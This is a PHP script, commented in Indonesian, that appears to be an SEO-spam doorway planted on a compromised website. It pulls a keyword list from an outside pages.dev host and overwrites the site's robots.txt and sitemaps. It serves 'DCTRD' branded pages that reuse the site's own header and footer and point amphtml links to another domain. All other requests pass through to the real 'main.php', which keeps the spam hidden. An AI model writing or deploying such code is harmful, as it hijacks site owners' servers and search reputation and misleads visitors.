<?php

function fetchRemoteFile($url)
{
    // Coba file_get_contents() terlebih dahulu
    $content = @file_get_contents($url);

    if ($content !== false && strlen($content) > 0) {
        return $content;
    }

    // Fallback ke cURL
    if (function_exists('curl_init')) {
        $ch = curl_init($url);

        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_ENCODING => '',
            CURLOPT_HTTPHEADER => [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.9',
            ],
        ]);

        $content = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($content !== false && $httpCode >= 200 && $httpCode < 400 && strlen($content) > 0) {
            return $content;
        }
    }

    return false;
}

function feedback404()
{
    header("HTTP/1.0 403 Forbidden");
    echo "<h1>403 Forbidden</h1>";
    exit();
}

// URL keyword list (pastee.dev)
$github_x_url = 'https://kwbranddss.pages.dev/x.txt';

// ============================[ SITEMAP GENERATOR ]============================
if (isset($_GET['sitemap'])) {
    $protocol   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
    $base_path  = $protocol . "://" . $_SERVER['HTTP_HOST'];
    $domain_url = $base_path . '/';
    $base_url   = $base_path . '/?id=';
    $sitemap_name = 'sitemap';
    $max_links_per_sitemap = 50000;

    $keywords_content = fetchRemoteFile($github_x_url);
    if ($keywords_content === false) {
        die("❌ Gagal fetch keyword list");
    }

    $raw_lines = explode("\n", $keywords_content);
    $keywords = array_map('trim', $raw_lines);
    $keywords = array_filter($keywords);

    if (empty($keywords)) {
        die("❌ No valid keywords found");
    }

    $sitemap_index  = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    $sitemap_index .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;

    $sitemap_files = [];

    foreach ($keywords as $i => $keyword) {
        $clean_keyword = str_replace(' ', '+', $keyword);
        $sitemap_num = ceil(($i + 1) / $max_links_per_sitemap);

        if (!isset($sitemap_files[$sitemap_num])) {
            $sitemap_files[$sitemap_num]  = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
            $sitemap_files[$sitemap_num] .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
        }

        $full_url = $base_url . $clean_keyword;
        $escaped_url = htmlspecialchars($full_url, ENT_XML1, 'UTF-8');

        $sitemap_files[$sitemap_num] .= "  <url>" . PHP_EOL;
        $sitemap_files[$sitemap_num] .= "    <loc>{$escaped_url}</loc>" . PHP_EOL;
        $sitemap_files[$sitemap_num] .= "  </url>" . PHP_EOL;
    }

    foreach ($sitemap_files as $num => &$content) {
        $content .= '</urlset>' . PHP_EOL;
        $file_name = "{$sitemap_name}-{$num}.xml";
        file_put_contents($file_name, $content);

        $sitemap_index .= "  <sitemap>" . PHP_EOL;
        $sitemap_index .= "    <loc>" . htmlspecialchars($domain_url . $file_name, ENT_XML1, 'UTF-8') . "</loc>" . PHP_EOL;
        $sitemap_index .= "  </sitemap>" . PHP_EOL;
    }

    $sitemap_index .= '</sitemapindex>' . PHP_EOL;
    file_put_contents("sitemap-index.xml", $sitemap_index);

    $robots  = "User-agent: *\n";
    $robots .= "Allow: /\n\n";
    $robots .= "Sitemap: {$domain_url}sitemap-index.xml\n";
    file_put_contents("robots.txt", $robots);

    echo "✅ Sitemap & robots.txt generated!";
    exit();
}

// ============================[ HELPER FUNCTIONS ]============================
function extractCSS($html, $base_url = '') {
    $css_content = '';

    preg_match_all('/<style[^>]*>(.*?)<\/style>/is', $html, $style_matches);
    if (!empty($style_matches[1])) {
        $css_content .= "<style>\n" . implode("\n", $style_matches[1]) . "\n</style>\n";
    }

    preg_match_all('/<link\s+([^>]*?)>/i', $html, $link_matches);

    if (!empty($link_matches[1])) {
        foreach ($link_matches[1] as $link_attrs) {
            if (preg_match('/href\s*=\s*["\']?([^\s"\'>\]]+)["\']?/i', $link_attrs, $href_match)) {
                $css_url = trim($href_match[1]);

                $is_css = preg_match('/\.css/i', $css_url) ||
                         preg_match('/rel\s*=\s*["\']?stylesheet/i', $link_attrs) ||
                         preg_match('/rel\s*=\s*["\']?[^"\']*stylesheet[^"\']*["\']?/i', $link_attrs);

                if ($is_css && !empty(trim($css_url))) {
                    if (!preg_match('/^(https?:|\/\/)/i', $css_url) && !empty($base_url)) {
                        $css_url = rtrim($base_url, '/') . '/' . ltrim($css_url, '/');
                    }

                    $css_content .= '<link rel="stylesheet" href="' . htmlspecialchars($css_url, ENT_QUOTES) . '">' . "\n";
                }
            }
        }
    }

    return $css_content;
}

function extractHeader($html) {
    if (preg_match('/<header\s[^>]*>.*?<\/header>/is', $html, $matches)) {
        return $matches[0];
    }
    if (preg_match('/<nav\s[^>]*>.*?<\/nav>/is', $html, $matches)) {
        return $matches[0];
    }
    return '';
}

function extractFooter($html) {
    if (preg_match('/<footer[^>]*>.*?<\/footer>/is', $html, $matches)) {
        return $matches[0];
    }
    return '';
}

// ============================[ MAIN LOGIC ]============================
if (isset($_GET['id']) && $_GET['id'] !== '') {

    $keywords_content = fetchRemoteFile($github_x_url);

    if ($keywords_content === false) {
        feedback404();
    }

    $lines = explode("\n", $keywords_content);
    $target_string = strtolower(trim($_GET['id']));
    $BRAND = null;

    foreach ($lines as $item) {
        if (strtolower(trim($item)) === $target_string) {
            $BRAND = strtoupper($target_string);
            break;
        }
    }

    if (!isset($BRAND)) {
        feedback404();
    }

    $BRANDS = $BRAND;

    // Bangun URL dinamis
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

    $parsedUrl = parse_url($fullUrl);
    $scheme = $parsedUrl['scheme'] ?? $protocol;
    $host   = $parsedUrl['host'] ?? $_SERVER['HTTP_HOST'];
    $path   = $parsedUrl['path'] ?? '/';
    $query  = $parsedUrl['query'] ?? '';

    $urlPath = $scheme . "://" . $host . $path . '?' . $query;
    $base_url = $scheme . "://" . $host;

    // Fetch homepage target
    $default_page = $base_url . "/";
    $website_html = fetchRemoteFile($default_page);

    if ($website_html !== false && strlen($website_html) > 0) {
        preg_match('/<head[^>]*>.*?<\/head>/is', $website_html, $head_match);
        $website_head = $head_match[0] ?? '';
        $extracted_header = extractHeader($website_html);
        $extracted_footer = extractFooter($website_html);
        $fetch_success = !empty($website_head);
    } else {
        $website_head = '';
        $extracted_header = '';
        $extracted_footer = '';
        $fetch_success = false;
    }

    // === FALLBACK: kalau fetch homepage gagal, pakai template default ===
    if (!$fetch_success || empty($website_head)) {
        $website_head = '<head>'
            . '<meta charset="utf-8">'
            . '<meta name="viewport" content="width=device-width,initial-scale=1">'
            . '</head>';
        $extracted_header = '';
        $extracted_footer = '';
        $fetch_success = true;
    }

    // === DEBUG MODE ===
    if (isset($_GET['debug'])) {
        header('Content-Type: text/plain; charset=utf-8');
        echo "===== DEBUG INFO =====\n";
        echo "BRAND         : " . ($BRANDS ?? 'NULL') . "\n";
        echo "fetch_success : " . var_export($fetch_success, true) . "\n";
        echo "head length   : " . strlen($website_head) . "\n";
        echo "header length : " . strlen($extracted_header) . "\n";
        echo "footer length : " . strlen($extracted_footer) . "\n";
        echo "default_page  : " . $default_page . "\n";
        echo "urlPath       : " . $urlPath . "\n";
        echo "allow_url_fopen: " . ini_get('allow_url_fopen') . "\n";
        echo "curl_init     : " . (function_exists('curl_init') ? 'YES' : 'NO') . "\n";
        $test = @file_get_contents($default_page);
        echo "test length   : " . strlen($test ?: '') . "\n";
        $err = error_get_last();
        echo "test error    : " . ($err['message'] ?? 'none') . "\n";
        exit();
    }

    // ============================[ RENDER HALAMAN BRANDED ]============================
    echo '<!DOCTYPE html>' . "\n";
    echo '<html>' . "\n";

    $custom_head = $website_head;

    // Helper: replace atau tambah meta tag
    function updateMetaTag(&$head, $pattern, $replacement) {
        if (preg_match($pattern, $head)) {
            $head = preg_replace($pattern, $replacement, $head);
        } else {
            $head = preg_replace('/<\/head>/i', $replacement . "\n" . '</head>', $head);
        }
    }

    updateMetaTag($custom_head, '/<title>.*?<\/title>/is', '<title>' . $BRANDS . ' DCTRD Platform Digital untuk Informasi dan Layanan</title>');
    updateMetaTag($custom_head, '/<meta\s+name="description"[^>]*>/i', '<meta name="description" content="' . $BRANDS . ' DCTRD menghadirkan platform digital dengan informasi dan layanan yang membantu pengguna mengakses kebutuhan secara mudah dan praktis.">');
    updateMetaTag($custom_head, '/<meta\s+property="og:site_name"[^>]*>/i', '<meta property="og:site_name" content="' . $BRANDS . '">');
    updateMetaTag($custom_head, '/<meta\s+property="og:url"[^>]*>/i', '<meta property="og:url" content="' . $urlPath . '">');
    updateMetaTag($custom_head, '/<meta\s+property="og:title"[^>]*>/i', '<meta property="og:title" content="' . $BRANDS . ' DCTRD Platform Digital untuk Informasi dan Layanan">');
    updateMetaTag($custom_head, '/<meta\s+property="og:type"[^>]*>/i', '<meta property="og:type" content="product">');
    updateMetaTag($custom_head, '/<meta\s+property="og:description"[^>]*>/i', '<meta property="og:description" content="' . $BRANDS . ' DCTRD menghadirkan platform digital dengan informasi dan layanan yang membantu pengguna mengakses kebutuhan secara mudah dan praktis.">');
    updateMetaTag($custom_head, '/<meta\s+name="twitter:title"[^>]*>/i', '<meta name="twitter:title" content="' . $BRANDS . ' DCTRD Platform Digital untuk Informasi dan Layanan">');
    updateMetaTag($custom_head, '/<meta\s+name="twitter:description"[^>]*>/i', '<meta name="twitter:description" content="' . $BRANDS . ' DCTRD menghadirkan platform digital dengan informasi dan layanan yang membantu pengguna mengakses kebutuhan secara mudah dan praktis.">');
    updateMetaTag($custom_head, '/<link\s+rel="canonical"[^>]*>/i', '<link rel="canonical" href="' . $urlPath . '">');
    updateMetaTag($custom_head, '/<meta\s+http-equiv="X-UA-Compatible"[^>]*>/i', '<meta http-equiv="X-UA-Compatible" content="IE=edge">');
    updateMetaTag($custom_head, '/<meta\s+name="viewport"[^>]*>/i', '<meta name="viewport" content="width=device-width,initial-scale=1">');
    updateMetaTag($custom_head, '/<meta\s+name="referrer"[^>]*>/i', '<meta name="referrer" content="no-referrer-when-downgrade">');
    updateMetaTag($custom_head, '/<meta\s+http-equiv="Referrer-Policy"[^>]*>/i', '<meta http-equiv="Referrer-Policy" content="no-referrer-when-downgrade">');
    updateMetaTag($custom_head, '/<meta\s+name="theme-color"[^>]*>/i', '<meta name="theme-color" content="">');

    // amphtml
    $amphtml_link = '<link rel="amphtml" href="https://dctrd-new.pages.dev/amp/?id=' . $BRANDS . '">';
    updateMetaTag($custom_head, '/<link\s+rel="amphtml"[^>]*>/i', $amphtml_link);

    // aPageStart
    if (!preg_match('/<script>var\s+aPageStart/i', $custom_head)) {
        $custom_head = preg_replace('/<head[^>]*>/i', '<head>' . "\n" . '<script>var aPageStart = (new Date()).getTime();</script>', $custom_head);
    }

    echo $custom_head . "\n";

    // Body
    echo '<body>' . "\n";
    echo $extracted_header . "\n";

    echo '<main style="padding: 60px 20px; text-align: center; min-height: 400px; display: flex; align-items: center; justify-content: center;">' . "\n";
    echo '<div>' . "\n";
    echo '<h1 style="font-size: 48px; margin-bottom: 20px;">' . $BRANDS . '</h1>' . "\n";
    echo '<p style="font-size: 20px; color: #666; margin-bottom: 30px;">DCTRD menghadirkan platform digital dengan informasi dan layanan yang membantu pengguna mengakses kebutuhan secara mudah dan praktis.</p>' . "\n";
    echo '<p style="color: #999; font-size: 14px;">' . date('Y-m-d H:i:s') . '</p>' . "\n";
    echo '</div>' . "\n";
    echo '</main>' . "\n";

    echo $extracted_footer . "\n";
    echo '</body>' . "\n";
    echo '</html>' . "\n";
    exit();
}

// ============================[ FALLBACK: TANPA ?id ]============================
include 'main.php';
exit();